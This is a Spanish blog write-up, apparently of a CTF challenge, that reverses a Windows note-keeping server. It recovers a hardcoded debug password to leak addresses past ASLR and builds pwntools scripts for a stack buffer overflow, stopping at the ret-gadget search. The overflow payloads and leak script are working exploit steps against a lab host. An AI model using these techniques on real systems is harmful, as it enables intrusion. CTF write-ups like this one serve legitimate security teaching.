@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup OffSec Remote Note Keeper</title>
+
+  <meta name="description" content="Resolución del reto Remote Note Keeper del CTF de OffSec">
+  <meta name="author" content="xchg2pwn">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup OffSec Remote Note Keeper">
+  <meta name="twitter:description" content="Resolución del reto Remote Note Keeper del CTF de OffSec">
+  <meta name="twitter:creator" content="xchg2pwn">  
+  <meta name="twitter:image" content="/images/otros/offsec.png" />
+
+  <meta property="og:site_name" content="xchg2pwn" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup OffSec Remote Note Keeper">
+  <meta property="og:description" content="Resolución del reto Remote Note Keeper del CTF de OffSec">
+  <meta property="og:image" content="/images/otros/offsec.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/otros/offsec.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup OffSec Remote Note Keeper" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="xchg2pwn">
+          <h1 class="panel-cover__title panel-title scale-up-center">xchg2pwn</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/challenges" title="xchg2pwn" class="blog-button">Challenges</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+
+              <li class="navigation__item grow">
+                <a href="https://github.com/xchg2pwn" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://linkedin.com/in/enrique-de-los-santos-694863233" title="Linkedin" target="_blank">
+                  <i class="icon icon-social-linkedin"></i>
+                  <span class="label">Linkedin</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/xchg2pwn" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/xchg2pwn" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@xchg2pwn" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:xchg2pwn@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>              
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#reversing">Reversing</a></li>
+        <li><a href="#exploitation">Explotación</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">OffSec</h4>
+    <picture><img src="/images/otros/offsec.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Remote Note Keeper</h2><br>
+  </header>
+  
+<section class="post" id="reversing">
+<br><h3 class="post-title">Reversing</h3><br>
+
+<p class="plain-text">Al ejecutar el programa muestra que se ha creado un directorio llamado <code class="language-plaintext highlighter-rouge">NOTES</code> y que seinició un servidor en el puerto <code class="language-plaintext highlighter-rouge">1337</code> por lo que se deberia haber iniciado un listener</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\user\Desktop></span><span class="am"> .\RemoteNoteKeeper.exe</span><span class="p">
+[*] Directory "NOTES" created or already exists.  
+[+] Server listening on port 1337...</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al conectarnos al puerto tenemos varios comandos interesantes, con <code class="language-plaintext highlighter-rouge">NOTE</code> y un argumento podemos escribir un <code class="language-plaintext highlighter-rouge">.txt</code> con el argumento como contenido, con <code class="language-plaintext highlighter-rouge">LIST</code> podemos listar las notas <code class="language-plaintext highlighter-rouge">.txt</code> existentes y con <code class="language-plaintext highlighter-rouge">READ</code> y el indice podemos leerlas</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ netcat</span><span class="p"> 192.168.100.5 1337
+  ___               _         _  _     _         _  __
+ | _ \___ _ __  ___| |_ ___  | \| |___| |_ ___  | |/ /___ ___ _ __  ___ _ _
+ |   / -_) '  \/ _ \  _/ -_) | .` / _ \  _/ -_) | ' &lt/ -_) -_) '_ \/ -_) '_|  
+ |_|_\___|_|_|_\___/\__\___| |_|\_\___/\__\___| |_|\_\___\___| .__/\___|_|
+                                                             |_|
+
+Available commands:
+- NOTE &lttext>: This stores your input text as a note on the remote server
+- READ &ltindex>: This reads the specified note from the remote server
+- LIST: This lists your notes
+- EXIT: Leave the Remote Note Keeper Application
+
+> NOTE AAAAAAAA
+
+> LIST
+Files in the Notes directory:
+NOTE_1.txt
+
+> READ 1
+AAAAAAAA
+
+></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para poder depurar el programa facilmente abriremos la aplicación dentro de <code class="language-plaintext highlighter-rouge">WinDbg</code></p>
+<a href="/challenges/remotenotekeeper/1.png" target="_blank"><div><p><img src="/challenges/remotenotekeeper/1.png"></p></div></a>
+
+<p class="plain-text">Si miramos los detalles del módulo podemos ver que contiene la protección <code class="language-plaintext highlighter-rouge">ASLR</code> por lo que la dirección base del binario deberia cambiar después de cada reinicio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> !py mona modules -m RemoteNoteKeeper.exe
+Hold on...
+[+] Command used:
+!py C:\Users\user\Documents\WinDbgX\x86\mona.py modules -m RemoteNoteKeeper.exe
+
+---------- Mona command started on 2024-12-15 22:06:58 (v2.0, rev 636) ----------
+[+] Processing arguments and criteria
+    - Pointer access level : X
+    - Only querying modules RemoteNoteKeeper.exe
+[+] Generating module info table, hang on...
+    - Processing modules
+    - Done. Let's rock 'n roll.
+----------------------------------------------------------------------------------------------------------------------------  
+ Module info :
+----------------------------------------------------------------------------------------------------------------------------  
+ Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | CFG   | NXCompat | OS Dll | Version, Modulename
+----------------------------------------------------------------------------------------------------------------------------  
+ 0x009b0000 | 0x009b7000 | 0x00007000 | True   | True    | True  | False |  False   | False  | -1.0- [RemoteNoteKeeper.exe]
+----------------------------------------------------------------------------------------------------------------------------  
+
+[+] Preparing output file 'modules.txt'
+    - (Re)setting logfile C:\mona\modules.txt</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Abrimos el programa en <code class="language-plaintext highlighter-rouge">ida</code>, La función <code class="language-plaintext highlighter-rouge">main</code> inicia llamando a una función que renombramos como <code class="language-plaintext highlighter-rouge">notes</code> y a una función <code class="language-plaintext highlighter-rouge">server</code>, las analizaremos después pero digamos que devuelve un descriptor, si es un descriptor válido salta al bloque de la izquierda que llama a la función <code class="language-plaintext highlighter-rouge">accept</code> para recibir una conexión entrante</p>
+<a href="/challenges/remotenotekeeper/2.png" target="_blank"><div><p><img src="/challenges/remotenotekeeper/2.png"></p></div></a>
+
+<p class="plain-text">La función notes es muy sencilla, llama a la función <code class="language-plaintext highlighter-rouge">CreateDirectoryA</code> para crear el directorio <code class="language-plaintext highlighter-rouge">NOTES</code> y muestra un mensaje que vimos en el inicio al ejecutar el programa</p>
+<a href="/challenges/remotenotekeeper/4.png" target="_blank"><div><p><img src="/challenges/remotenotekeeper/4.png"></p></div></a>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">server</code> inicia llamando a la función <code class="language-plaintext highlighter-rouge">WSAStartup</code> para inicializar winsock y luego llama a la función <code class="language-plaintext highlighter-rouge">socket</code> para crear un socket y este devuelve un descriptor</p>
+<a href="/challenges/remotenotekeeper/5.png" target="_blank"><div><p><img src="/challenges/remotenotekeeper/5.png"></p></div></a>
+
+<p class="plain-text">Ahora utiliza <code class="language-plaintext highlighter-rouge">htons</code> para darle formato al puerto <code class="language-plaintext highlighter-rouge">1337</code> y posteriormente llamar a <code class="language-plaintext highlighter-rouge">bind</code> y <code class="language-plaintext highlighter-rouge">listen</code> para ponerse en escucha de conexiones entrantes en ese puerto</p>
+<a href="/challenges/remotenotekeeper/6.png" target="_blank"><div><p><img src="/challenges/remotenotekeeper/6.png"></p></div></a>
+
+<p class="plain-text">Luego de llamar a <code class="language-plaintext highlighter-rouge">accept</code> si sale bien llama a la función <code class="language-plaintext highlighter-rouge">beginthread</code> para crear un hilo por cada conexión que ejecuta la función <code class="language-plaintext highlighter-rouge">StartAddress</code> pasandole el descriptor</p>
+<a href="/challenges/remotenotekeeper/3.png" target="_blank"><div><p><img src="/challenges/remotenotekeeper/3.png"></p></div></a>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">StartAddress</code> que recibe el descriptor inicia llamando a la función <code class="language-plaintext highlighter-rouge">printf</code> para mostrar en la consola la dirección y puerto de donde se recibió la conexión</p>
+<a href="/challenges/remotenotekeeper/7.png" target="_blank"><div><p><img src="/challenges/remotenotekeeper/7.png"></p></div></a>
+
+<p class="plain-text">Luego envia con <code class="language-plaintext highlighter-rouge">send</code> un prompt que es el caracter <code class="language-plaintext highlighter-rouge">></code> y recibe un total de <code class="language-plaintext highlighter-rouge">0x1000</code> bytes a través de la función <code class="language-plaintext highlighter-rouge">recv</code>, esto lo almacena en un buffer y realiza un salto</p>
+<a href="/challenges/remotenotekeeper/8.png" target="_blank"><div><p><img src="/challenges/remotenotekeeper/8.png"></p></div></a>
+
+<p class="plain-text">Si el buffer es mayor a <code class="language-plaintext highlighter-rouge">0</code> muestra con <code class="language-plaintext highlighter-rouge">printf</code> que se se recibieron datos del cliente, luego compara los primeros <code class="language-plaintext highlighter-rouge">4</code> bytes del buffer con <code class="language-plaintext highlighter-rouge">EXIT</code> llamando a <code class="language-plaintext highlighter-rouge">strncmp</code>, si es igual salta a la linea roja de lo contrario a la verde, entonces seguimos la verde</p>
+<a href="/challenges/remotenotekeeper/9.png" target="_blank"><div><p><img src="/challenges/remotenotekeeper/9.png"></p></div></a>
+
+<p class="plain-text">Si no es <code class="language-plaintext highlighter-rouge">EXIT</code> compara los <code class="language-plaintext highlighter-rouge">4</code> bytes con <code class="language-plaintext highlighter-rouge">LIST</code>, nuevamente si es igual salta a la linea roja si no es igual compara los primeros <code class="language-plaintext highlighter-rouge">5</code> bytes con <code class="language-plaintext highlighter-rouge">NOTE </code>, si se cumple la primera comparación llama a una función que llamamos <code class="language-plaintext highlighter-rouge">lister</code> que ya sabemos que hace, si se cumple la segunda llama a <code class="language-plaintext highlighter-rouge">annotator</code> que será donde profundizaremos</p>
+<a href="/challenges/remotenotekeeper/10.png" target="_blank"><div><p><img src="/challenges/remotenotekeeper/10.png"></p></div></a>
+<a href="/challenges/remotenotekeeper/11.png" target="_blank"><div><p><img src="/challenges/remotenotekeeper/11.png"></p></div></a>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">annotator</code> inicia definiendo el inicio, el final y el tamaño, luego compara el tamaño con <code class="language-plaintext highlighter-rouge">0xfff</code> o <code class="language-plaintext highlighter-rouge">4095</code>, si es menor o igual saltará al bloque de la linea verde</p>
+<a href="/challenges/remotenotekeeper/15.png" target="_blank"><div><p><img src="/challenges/remotenotekeeper/15.png"></p></div></a>
+
+<p class="plain-text">En el bloque llama a <code class="language-plaintext highlighter-rouge">memcpy</code> que lo que hace es copiar el contenido de la nota en el buffer en <code class="language-plaintext highlighter-rouge">ebp - 4076</code>, luego de eso lo guarda en un archivo <code class="language-plaintext highlighter-rouge">.txt</code>, aqui tenemos la primera vulnerabilidad ya que el buffer soporta menos de los datos que se reciben</p>
+<a href="/challenges/remotenotekeeper/16.png" target="_blank"><div><p><img src="/challenges/remotenotekeeper/16.png"></p></div></a>
+
+<p class="plain-text">Volvemos a <code class="language-plaintext highlighter-rouge">StartAddress</code>, en el caso que los primeros <code class="language-plaintext highlighter-rouge">5</code> bytes sean iguales a <code class="language-plaintext highlighter-rouge">DEBUG</code> llama a la función <code class="language-plaintext highlighter-rouge">strtok</code> y posteriormente a <code class="language-plaintext highlighter-rouge">auth</code> pasandole como parámetro el argumento de <code class="language-plaintext highlighter-rouge">DEBUG</code>, si la comparación es correcta llama a la función <code class="language-plaintext highlighter-rouge">leak</code></p>
+<a href="/challenges/remotenotekeeper/12.png" target="_blank"><div><p><img src="/challenges/remotenotekeeper/12.png"></p></div></a>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">auth</code> inicia estableciendo un array de valores que es la contraseña cifrada, además <code class="language-plaintext highlighter-rouge">3</code> caracteres que utiliza como key que corresponden a la string <code class="language-plaintext highlighter-rouge">nop</code>, además declara una variable password en <code class="language-plaintext highlighter-rouge">0</code> y algunas más renombradas</p>
+<a href="/challenges/remotenotekeeper/13.png" target="_blank"><div><p><img src="/challenges/remotenotekeeper/13.png"></p></div></a>
+
+<p class="plain-text">Luego inicia un bucle por cada uno de los valores del array, en cada iteración obbtiene el modulo <code class="language-plaintext highlighter-rouge">i % 3</code> utilizando <code class="language-plaintext highlighter-rouge">idiv</code> y lo utiliza como un índice para tomar un caracter de la key, realiza una operación <code class="language-plaintext highlighter-rouge">xor</code> con el valor actual y el caractér correspondiente, finalmente almacena el resultado en un nuevo array al que llamaremos <code class="language-plaintext highlighter-rouge">expected</code></p>
+<a href="/challenges/remotenotekeeper/14.png" target="_blank"><div><p><img src="/challenges/remotenotekeeper/14.png"></p></div></a>
+
+<p class="plain-text">Entonces podemos crear un script en <code class="language-plaintext highlighter-rouge">python</code> que itere en cada uno de los valores del array y realize el proceso <code class="language-plaintext highlighter-rouge">xor</code> sobre el carácter actual y la key en la posición del modulo de <code class="language-plaintext highlighter-rouge">i % 3</code>, al ejecutarlo nos muestra la contraseña original que podemos usar</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3</span><span class="p">
+
+password </span><span class="o">=</span><span class="p"> [</span><span class="mi">11</span><span class="p">,</span><span class="mi"> 23</span><span class="p">, </span><span class="mi">0</span><span class="p">,</span><span class="mi"> 93</span><span class="p">,</span><span class="mi"> 95</span><span class="p">, </span><span class="mi">65</span><span class="p">,</span><span class="mi"> 7</span><span class="p">,</span><span class="mi"> 28</span><span class="p">,</span><span class="mi"> 22</span><span class="p">, </span><span class="mi">27</span><span class="p">,</span><span class="mi"> 1</span><span class="p">]  
+key</span><span class="o"> = </span><span class="s">"nop"</span><span class="p">
+
+expected</span><span class="o"> =</span><span class="s"> ""</span><span class="p">
+
+</span><span class="o">for</span><span class="p"> i</span><span class="o"> in</span><span class="no"> range</span><span class="p">(</span><span class="no">len</span><span class="p">(password)):
+    character</span><span class="o"> =</span><span class="no"> chr</span><span class="p">(password[i] </span><span class="o">^ </span><span class="no">ord</span><span class="p">(key[i </span><span class="o">% </span><span class="mi">3</span><span class="p">]))
+    expected</span><span class="o"> +=</span><span class="p"> character
+
+</span><span class="no">print</span><span class="p">(expected)</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">decoder.py  
+exp301isfun</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Vamos con la función <code class="language-plaintext highlighter-rouge">leak</code>, esta crea un archivo <code class="language-plaintext highlighter-rouge">DEBUG.txt</code> y guarda un par de cosas como el nombre del equipo y nombre de usuario actuales que obtiene con funciones de <code class="language-plaintext highlighter-rouge">winapi</code>, en este caso con <code class="language-plaintext highlighter-rouge">GetComputerNameA</code> y <code class="language-plaintext highlighter-rouge">GetUserNameA</code> respectivamente</p>
+<a href="/challenges/remotenotekeeper/17.png" target="_blank"><div><p><img src="/challenges/remotenotekeeper/17.png"></p></div></a>
+
+<p class="plain-text">Luego obtiene el proceso actual con <code class="language-plaintext highlighter-rouge">GetCurrentProcess</code> y obtiene una lista de todos los módulos cargados en el proceso actual llamando a <code class="language-plaintext highlighter-rouge">K32EnumProcessModules</code></p>
+<a href="/challenges/remotenotekeeper/18.png" target="_blank"><div><p><img src="/challenges/remotenotekeeper/18.png"></p></div></a>
+
+<p class="plain-text">Entonces, por cada uno de los módulos escribe en el archivo el nombre del módulo y su dirección base en el formato <code class="language-plaintext highlighter-rouge">0x%08X</code>, esto sirve como un leak de la base del binario</p>
+<a href="/challenges/remotenotekeeper/19.png" target="_blank"><div><p><img src="/challenges/remotenotekeeper/19.png"></p></div></a>
+
+<p class="plain-text">Nos conectamos, utilizamos la función <code class="language-plaintext highlighter-rouge">DEBUG</code> pasandole la contraseña y una vez se creo el <code class="language-plaintext highlighter-rouge">.txt</code> podemos leer el archivo y de esta forma obtenemos un leak de la dirección base del binario que nos servirá para bypassear el <code class="language-plaintext highlighter-rouge">ASLR</code> que está activo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ netcat </span><span class="p">192.168.100.5 1337
+  ___               _         _  _     _         _  __
+ | _ \___ _ __  ___| |_ ___  | \| |___| |_ ___  | |/ /___ ___ _ __  ___ _ _
+ |   / -_) '  \/ _ \  _/ -_) | .` / _ \  _/ -_) | ' &lt/ -_) -_) '_ \/ -_) '_|  
+ |_|_\___|_|_|_\___/\__\___| |_|\_\___/\__\___| |_|\_\___\___| .__/\___|_|
+                                                             |_|
+
+Available commands:
+- NOTE &lttext>: This stores your input text as a note on the remote server
+- READ &ltindex>: This reads the specified note from the remote server
+- LIST: This lists your notes
+- EXIT: Leave the Remote Note Keeper Application
+
+> DEBUG exp301isfun
+
+> LIST
+Files in the Notes directory:
+DEBUG.txt
+
+> READ DEBUG
+[*] Computer Name: WINDOWS
+[*] User Name: user
+[*] Loaded Modules:
+    C:\Users\user\Desktop\RemoteNoteKeeper.exe (Base Address: 0x009B0000)
+    C:\Windows\SYSTEM32\ntdll.dll (Base Address: 0x77870000)
+    C:\Windows\System32\KERNEL32.DLL (Base Address: 0x75DC0000)
+    C:\Windows\System32\KERNELBASE.dll (Base Address: 0x771F0000)
+    C:\Windows\System32\ADVAPI32.dll (Base Address: 0x758B0000)
+    C:\Windows\System32\msvcrt.dll (Base Address: 0x76600000)
+    C:\Windows\System32\sechost.dll (Base Address: 0x776B0000)
+    C:\Windows\System32\bcrypt.dll (Base Address: 0x75930000)
+    C:\Windows\System32\RPCRT4.dll (Base Address: 0x754A0000)
+    C:\Windows\System32\WS2_32.dll (Base Address: 0x76FD0000)
+    C:\Windows\System32\ucrtbase.dll (Base Address: 0x77740000)
+    C:\Windows\SYSTEM32\VCRUNTIME140.dll (Base Address: 0x75420000)
+    C:\Windows\system32\mswsock.dll (Base Address: 0x72FC0000)
+    C:\Windows\SYSTEM32\kernel.appcore.dll (Base Address: 0x73960000)
+    C:\Windows\SYSTEM32\SspiCli.dll (Base Address: 0x739E0000)
+
+></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="exploitation">
+<br><h3 class="post-title">Explotación</h3><br>
+
+<p class="plain-text">Iniciaremos nuestro exploit automatizando el proceso anterior en un script de <code class="language-plaintext highlighter-rouge">python</code>, de esta forma obtenemos la dirección base del binario que utilizaremos más adelante</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote, log
+
+shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"192.168.100.5"</span><span class="p">,</span><span class="mi"> 1337</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"DEBUG exp301isfun"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"READ DEBUG"</span><span class="p">)
+
+binary_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline_contains(</span><span class="no">b</span><span class="s">"RemoteNoteKeeper.exe"</span><span class="p">)[</span><span class="o">-</span><span class="mi">11</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">], </span><span class="mi">16</span><span class="p">)  
+log.info(</span><span class="no">f</span><span class="s">"Binary base: </span><span class="p">{</span><span class="no">hex</span><span class="p">(binary_base)}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> exploit.py
+[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.5 on port 1337: Done  
+[</span><span class="az">*</span><span class="p">] Binary base: 0x9b0000
+[</span><span class="az">*</span><span class="p">] Closed connection to 192.168.100.5 port 1337</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Vamos con la vulnerabilidad real, en la función <code class="language-plaintext highlighter-rouge">NOTE</code> sabemos que hay un buffer overflow, enviamos <code class="language-plaintext highlighter-rouge">4076 A's</code> para rellenar el buffer antes de ebp, <code class="language-plaintext highlighter-rouge">4 B's</code> que será el valor de <code class="language-plaintext highlighter-rouge">ebp</code> en el <code class="language-plaintext highlighter-rouge">leave</code> y <code class="language-plaintext highlighter-rouge">4 C's</code> que tomarán el valor del return address, finalmente algunas <code class="language-plaintext highlighter-rouge">D's</code> que se deberian almacenar en el stack si todo sale bien</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote
+
+shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"192.168.100.5"</span><span class="p">,</span><span class="mi"> 1337</span><span class="p">)  
+
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"NOTE "</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 4076</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"C"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"D"</span><span class="o"> *</span><span class="mi"> 48</span><span class="p">
+
+shell.sendafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">, payload)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Enviamos el exploit pero encontramos un problema y aunque lo primero es correcto y tenemos el offset al return address, debido a la limitación de espacio en el stack solo encontramos <code class="language-plaintext highlighter-rouge">7 D's</code> representadas en el stack que no es un espacio suficiente para guardar un shellcode en el stack y saltar a el con un gadget <code class="language-plaintext highlighter-rouge">jmp esp</code> o similar</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> g
+(26b8.1fe8): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000000 ebx=00a47fb8 ecx=00dbdb48 edx=77844334 esi=009b1ce0 edi=00a47fb8  
+eip=43434343 esp=00dbebb8 ebp=42424242 iopl=0         nv up ei pl zr na pe nc  
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246  
+43434343 ??              ???
+
+</span><span class="ro">0:000></span><span class="p"> db esp
+0158ed8c  44 44 44 44 44 44 44 45-20 41 41 41 41 41 41 41  DDDDDDDE AAAAAAA
+0158ed9c  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+0158edac  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+0158edbc  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+0158edcc  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+0158eddc  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+0158edec  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+0158edfc  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Lo interesante está cuando no sobrescribimos valores después del return address</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote
+
+shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"192.168.100.5"</span><span class="p">,</span><span class="mi"> 1337</span><span class="p">)  
+
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"NOTE "</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 4076</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"C"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
+
+shell.sendafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">, payload)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Cuando se corrompe el programa en el stack está almacenado un puntero al inicio del buffer, entonces podríamos ejecutar un gadget <code class="language-plaintext highlighter-rouge">ret</code> que ejecutará lo que esté en esa dirección y como apunta al inicio serian nuestras <code class="language-plaintext highlighter-rouge">A's</code> donde enviaremos un shellcode</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> g
+(26b8.1fe8): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000000 ebx=00a47fb8 ecx=00dbdb48 edx=77844334 esi=009b1ce0 edi=00a47fb8  
+eip=43434343 esp=00dbebb8 ebp=42424242 iopl=0         nv up ei pl zr na pe nc  
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246  
+43434343 ??              ???
+
+</span><span class="ro">0:000></span><span class="p"> db poi(esp)
+00dbebc1  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+00dbebd1  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+00dbebe1  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+00dbebf1  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+00dbec01  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+00dbec11  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+00dbec21  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+00dbec31  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para buscar el gadget podemos usar <code class="language-plaintext highlighter-rouge">ropper</code> indicando que la dirección base es <code class="language-plaintext highlighter-rouge">0</code> ya que tenemos el ASLR activo y necesitamos sumar la dirección base obtenida antes</p>
